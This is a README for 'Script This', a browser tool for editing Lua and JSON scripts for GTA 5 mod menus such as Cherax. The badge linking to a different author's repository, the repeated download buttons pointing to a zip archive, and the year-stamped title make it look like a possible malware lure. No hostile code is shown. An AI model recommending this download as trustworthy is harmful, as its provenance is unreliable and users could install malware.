# Script This v1.0 - JSON & Lua Development Tool 2026

> **A browser-based utility for viewing, editing, and organizing Lua script data for GTA 5 mod menus.** Built for Cherax, Modest Menu, and other similar customization platforms.

[![Development Tool](https://img.shields.io/badge/Type-Development%20Tool-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leox70/script-this-json-lua-tool?style=flat-square)](https://github.com/Ronnie-Reagan/ScriptThis)

---

<p align="center">
  <a href="https://leox70.github.io/script-this-json-lua-tool/">
    <img src="https://img.shields.io/badge/Download-Script%20This-brightgreen?style=for-the-badge" alt="Download Script This">
  </a>
</p>

> **[Direct Download - Script This](https://leox70.github.io/script-this-json-lua-tool/)**

---

[Download Latest Build](https://leox70.github.io/script-this-json-lua-tool/)

---

## What it does

Script This is an interactive browser workspace for anyone handling Lua scripts and JSON configuration files for GTA 5 mod menus. It blends a code viewer with a tree inspector so you can move through script structures, locate specific entries, and keep several documents open at once. The interface is geared toward quick inspection of script content without needing a full desktop IDE.

This release puts extra focus on smoother document navigation and cleaner export handling. You can jump between menu configurations, render JSON trees with adjustable styling, and copy selected content or save it out as files. A built-in music player and help overlay make it a self-contained companion for extended editing sessions.

---

## Main features

- **Split code/tree viewing** - Toggle between raw source and structured tree representation for the same file
- **Live search filtering** - Search script entries as you type, with matching results highlighted
- **Multi-select clipboard tools** - Select multiple nodes or lines and copy them together
- **Tree styling controls** - Change colors, indentation, and node display behavior
- **Expand/Collapse all** - Open or fold large JSON hierarchies in one step
- **Download JSON** - Export the full document or chosen branches as a JSON file
- **Fast document switching** - Load and switch among several menu configurations without refreshing the page
- **Music integration** - Background audio playback for longer working sessions
- **Help and documentation overlay** - On-screen guide that explains the available controls and features

---

## Getting started

Grab the latest build from the link above. Unzip the archive into a folder named `ScriptThis`. Then open `index.html` in a modern browser such as Chrome, Firefox, Edge, or a comparable browser. No server setup or installation is needed; everything runs locally in the browser.

To open a script, use the import button or drag and drop a JSON or Lua file into the interface. Once loaded, the document appears automatically in both code and tree views.

---

## Settings and shortcuts

| Setting | Description | Default |
|---------|-------------|---------|
| Tree indent | Number of pixels per indent level | 16px |
| Font size | Code view font size in pixels | 14px |
| Dark mode | Toggle between light and dark themes | On |
| Auto-expand | Expand all tree nodes on file load | Off |
| Clipboard format | Plain text or JSON format for copy actions | JSON |

Keyboard shortcuts:

| Key | Action |
|-----|--------|
| Ctrl+F | Open search bar |
| Ctrl+Shift+E | Expand all tree nodes |
| Ctrl+Shift+C | Collapse all tree nodes |
| Ctrl+S | Download current document as JSON |

---

## Compatibility

- **Browsers:** Chrome 80+, Firefox 80+, Edge 80+, Safari 14+
- **Target files:** JSON and Lua script files used with GTA 5 mod menus (Cherax, Modest Menu, etc.)
- **Limitations:** Large files (over 50 MB) may cause slower tree rendering. Lua syntax highlighting is basic - advanced IDE features are not included.

---

## FAQ

**How do I open a script file?**  
Drag a `.json` or `.lua` file into the interface, or click the file picker button in the top toolbar.

**Will my settings survive an update?**  
Yes. Settings are saved in browser local storage, so they remain after upgrading. Just replace the old folder with the new build.

**Can I customize more than the built-in options?**  
Yes. You can edit `config.js` to add themes or adjust the default hotkeys. The help overlay has additional details.

**Does this support mod menus beyond Cherax and Modest Menu?**  
It works with any JSON or Lua script structure. Actual compatibility depends on the file format used by the menu.

**Where do exported files end up?**  
Downloads are saved in your browser's default download location as `.json` files.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
